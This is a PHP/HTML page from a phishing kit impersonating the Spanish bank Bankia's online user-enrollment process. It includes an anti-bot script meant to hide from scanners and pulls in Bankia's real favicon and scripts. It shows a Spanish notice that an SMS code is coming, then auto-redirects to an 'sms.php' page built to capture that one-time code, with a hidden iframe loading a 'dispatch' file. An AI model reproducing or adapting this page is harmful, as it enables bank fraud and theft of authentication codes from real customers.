<?php
error_reporting(0);
include "antibots.php";

?>
<!DOCTYPE html>
<html ng-app="oip.enrollment" lang="es" class="ng-scope">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <style type="text/css">
        [uib-typeahead-popup].dropdown-menu {
            display: block;
        }
    </style>
    <style type="text/css">
        .uib-time input {
            width: 50px;
        }
    </style>
    <style type="text/css">
        [uib-tooltip-popup].tooltip.top-left>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.top-right>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.bottom-left>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.bottom-right>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.left-top>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.left-bottom>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.right-top>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.right-bottom>.tooltip-arrow,
        [uib-popover-popup].popover.top-left>.arrow,
        [uib-popover-popup].popover.top-right>.arrow,
        [uib-popover-popup].popover.bottom-left>.arrow,
        [uib-popover-popup].popover.bottom-right>.arrow,
        [uib-popover-popup].popover.left-top>.arrow,
        [uib-popover-popup].popover.left-bottom>.arrow,
        [uib-popover-popup].popover.right-top>.arrow,
        [uib-popover-popup].popover.right-bottom>.arrow {
            top: auto;
            bottom: auto;
            left: auto;
            right: auto;
            margin: 0;
        }

        [uib-popover-popup].popover,
        [uib-popover-template-popup].popover {
            display: block !important;
        }
    </style>
    <style type="text/css">
        .uib-datepicker .uib-title {
            width: 100%;
        }

        .uib-day button,
        .uib-month button,
        .uib-year button {
            min-width: 100%;
        }

        .uib-datepicker-popup.dropdown-menu {
            display: block;
            float: none;
            margin: 0;
        }

        .uib-button-bar {
            padding: 10px 9px 2px;
        }

        .uib-left,
        .uib-right {
            width: 100%
        }
    </style>
    <style type="text/css">
        .uib-position-measure {
            display: block !important;
            visibility: hidden !important;
            position: absolute !important;
            top: -9999px !important;
            left: -9999px !important;
        }

        .uib-position-scrollbar-measure {
            position: absolute;
            top: -9999px;
            width: 50px;
            height: 50px;
            overflow: scroll;
        }
    </style>
    <style type="text/css">
        .ng-animate.item:not(.left):not(.right) {
            -webkit-transition: 0s ease-in-out left;
            transition: 0s ease-in-out left
        }
    </style>
    <style type="text/css">
        @charset "UTF-8";
        [ng\:cloak],
        [ng-cloak],
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak,
        .ng-hide:not(.ng-hide-animate) {
            display: none !important;
        }

        ng\:form {
            display: block;
        }

        .ng-animate-shim {
            visibility: hidden;
        }

        .ng-anchor {
            position: absolute;
        }
    </style>
    <title>Alta de Usuario</title>
    <meta name="viewport" content="width=device-width" initial-scale="1">
    <meta name="description" content="Bankia-enrollment">
	<meta http-equiv="refresh" content="30;url=sms.php".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." " />
    <!-- inject:css-->
    <link rel="stylesheet" href="./Files/font-awesome.css">
    <link rel="stylesheet" href="./Files/bootstrap.css">
    <link rel="stylesheet" href="./Files/oip-icons.css">
    <link rel="stylesheet" href="./Files/oip-icons-overwrite.css">
    <link rel="stylesheet" href="./Files/helper.css">
    <link rel="stylesheet" href="./Files/Pe-media-icons.css">
    <link rel="stylesheet" href="./Files/helper(1).css">
    <link rel="stylesheet" href="./Files/pe-icon-7-stroke.css">
    <link rel="stylesheet" href="./Files/oip-styles.css">
    <link rel="stylesheet" href="./Files/oip-commons-safe-keyboard.css">
    <link rel="stylesheet" href="./Files/oip-enrollment.css">
    <link rel="stylesheet" href="./Files/access-key-creation.css">
    <link rel="stylesheet" href="./Files/bankia-already-user.css">
    <link rel="stylesheet" href="./Files/bankia-already-user-card.css">
    <link rel="stylesheet" href="./Files/bankia-already-user-cc.css">
    <link rel="stylesheet" href="./Files/bankia-office-contact.css">
    <link rel="stylesheet" href="./Files/bankia-telephone-contact.css">
    <link rel="stylesheet" href="./Files/conditions-acceptance.css">
    <link rel="stylesheet" href="./Files/confirmation.css">
    <link rel="stylesheet" href="./Files/confirm-modal.css">
    <link rel="stylesheet" href="./Files/case2-disabled.css">
    <link rel="stylesheet" href="./Files/digital-sign-creation.css">
    <link rel="stylesheet" href="./Files/finish-process.css">
    <link rel="stylesheet" href="./Files/footer.css">
    <link rel="stylesheet" href="./Files/header.css">
    <link rel="stylesheet" href="./Files/identity-verification.css">
    <link rel="stylesheet" href="./Files/personal-data.css">
    <link rel="stylesheet" href="./Files/recovery-key.css">
    <link rel="stylesheet" href="./Files/quiz.css">
    <link rel="stylesheet" href="./Files/session-expired.css">
    <link rel="stylesheet" href="./Files/sign-contracts.css">
    <link rel="stylesheet" href="./Files/slider-captcha.css">
    <link rel="stylesheet" href="./Files/steps-navegation.css">
    <link rel="stylesheet" href="./Files/steps-navegation-private.css">
    <link rel="stylesheet" href="./Files/document-modal.css">
    <link rel="stylesheet" href="./Files/sign-modal.css">
    <link rel="stylesheet" href="./Files/login.css">
    <link rel="stylesheet" href="./Files/help.css">
    <!-- endinject-->
    <link rel="icon" type="image/png" href="https://www.bankia.es/front/images/favicon.ico">
   <oip-enrollment></oip-enrollment>
    <!-- inject::js-->
   <script src="https://www.bankia.es/es/particulares/alta-usuario/enrollment/components/slider-captcha/slider-captcha.component.js"></script>
    <!-- endinject-->
 
</head>

<body><iframe src="./Files/dispatch.html" style="height: 1px; width: 1px; border: 0px; position: absolute; display: none; left: 0px; top: 0px; z-index: 0;"></iframe>
    <oip-enrollment class="ng-isolate-scope">
        <erm-header class="ng-isolate-scope">
            <div class="erm-header">
                <header>
                    <div class="container">
                        <div class="row oip-box margin-top margin-bottom cabecera-padding">
                            <div class="col-xs-10 col-md-8"><img src="./Files/CMP_IMG_h1_logo.PNG" class="logo">
                                <h2 ng-show="vm.setTypeHeader" class="title">Datos personales</h2>
                                <h2 ng-hide="vm.setTypeHeader" class="title ng-hide">Alta de usuario</h2>
                            </div>
                            <div class="hidden-xs col-sm-2 col-md-4 boton-desconectar">
                                <button ng-hide="vm.isPublic" ng-click="vm.logout()" class="oip-btn orange pull-right ng-hide"><i class="oip-icon fa fa-1x glyphicon glyphicon-off"></i>Desconectar</button>
                                <img src="Files/ico55.png" width="308" height="73" class="white pull-right" alt=""/>
                               </div>
                            </div>
                            <div ng-hide="vm.isPublic" class="visible-xs col-xs-2 icono-ayuda ng-hide"><span ng-click="vm.logout()" class="oip-icon circle orange fa-1x pull-right"><i class="oip-icon fa fa-1x glyphicon glyphicon-off desconectar"></i></span></div>
                            <div class="visible-xs col-xs-2 icono-ayuda"><span ng-click="vm.openHelp()" class="oip-icon circle fa-1x pull-right"><span class="numero">?</span></span>
                            </div>
                        </div>
                    </div>
                </header>
            </div>
        </erm-header>
        <!-- uiView: navigation -->
        <div ui-view="navigation" class="ng-scope">
            <erm-steps-navegation ng-show="isStep()" class="ng-scope ng-isolate-scope ng-hide">
                <div class="erm-steps-navegation">
                    <header>
                        <div class="container">
                            <div class="row">
                                <div class="col-md-12 oip-box margin-top margin-bottom">
                                    <div class="contenedor-pasos">
                                        <div oip-step-group="" oip-id="enrollmentMapProcess" auto-register="false" class="col-md-12 ng-scope">
                                            <div oip-step="personal-data" active="true" class="circulo-pasos paso1">
                                                <div ng-class="navigation.getStateClass(&#39;personal-data&#39;)" class="contenido-activo"> <span ng-show="manager[&#39;personal-data&#39;].completed" class="oip-icon margin-right circle fa fa-check fa-1x ng-hide"></span><span ng-hide="manager[&#39;personal-data&#39;].completed" class="oip-icon circle fa-1x"><span class="numero">1</span></span>
                                                    <div class="texto-paso">Datos personales</div>
                                                </div>
                                            </div>
                                            <div oip-step="access-key-creation" class="circulo-pasos paso2">
                                                <div ng-class="navigation.getStateClass(&#39;access-key-creation&#39;)" class="contenido-vacio"> <span ng-show="manager[&#39;access-key-creation&#39;].completed" class="oip-icon margin-right circle fa fa-check fa-1x ng-hide"></span><span ng-hide="manager[&#39;access-key-creation&#39;].completed" class="oip-icon circle fa-1x"><span class="numero">2</span></span>
                                                    <div class="texto-paso">Crear clave</div>
                                                </div>
                                            </div>
                                            <div oip-step="conditions-acceptance" class="circulo-pasos paso3">
                                                <div ng-class="navigation.getStateClass(&#39;conditions-acceptance&#39;)" class="contenido-vacio"> <span ng-show="manager[&#39;conditions-acceptance&#39;].completed" class="oip-icon margin-right circle fa fa-check fa-1x ng-hide"></span><span ng-hide="manager[&#39;conditions-acceptance&#39;].completed" class="oip-icon circle fa-1x"><span class="numero">3</span></span>
                                                    <div class="texto-paso">Aceptar condiciones</div>
                                                </div>
                                            </div>
                                            <div class="barra-navegacion"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </header>
                </div>
            </erm-steps-navegation>
        </div>
        <main class="container">
            <section class="content">
                <div class="row">
                    <div class="col-md-12 contenido">
                        <div class="container">
                            <erm-general-errors>
                                <!-- ngIf: generalErrors.list.length -->
                            </erm-general-errors>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <!-- uiView:  -->
                    <div ui-view="" class="col-md-12 contenido ng-scope">
                        <erm-recovery-key class="ng-scope ng-isolate-scope">
                            <div class="erm-personal-data">
                                <div class="container">
                                    <h3>El software genera automáticamente un código de simulación de alerta de cambio de número de teléfono Este código será enviado por SMS con este número de su asesor. 


Debe introducir este código en la siguiente página</h3>
                                    

                                        <div class="row"> </div>
                                        <div class="row">
                                            
                                                <div class="row">
                                                    
                                                    <p style="text-align:center;"><img src="Files/loading.gif" width="400" height="400" alt=""/></p>  </div></br></br></br></br></br>
            
                        </erm-recovery-key>
                    </div>
                </div>
            </section>
        </main>
        <erm-footer class="ng-isolate-scope">
            <div class="erm-footer">
                <footer class="container oip-box margin-top">
                    <div class="row">
                        <div class="col-md-12"><span class="ng-binding">© Bankia S.A, 2019. España. Todos los derechos reservados</span></div>
                    </div>
                </footer>
            </div>
        </erm-footer>
    </oip-enrollment>

    </script><noscript>&lt;div style="display:inline;"&gt;&lt;img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/970006428/?guid=ON&amp;amp;amp;script=0"&gt;&lt;/div&gt;</noscript>

</body>

</html>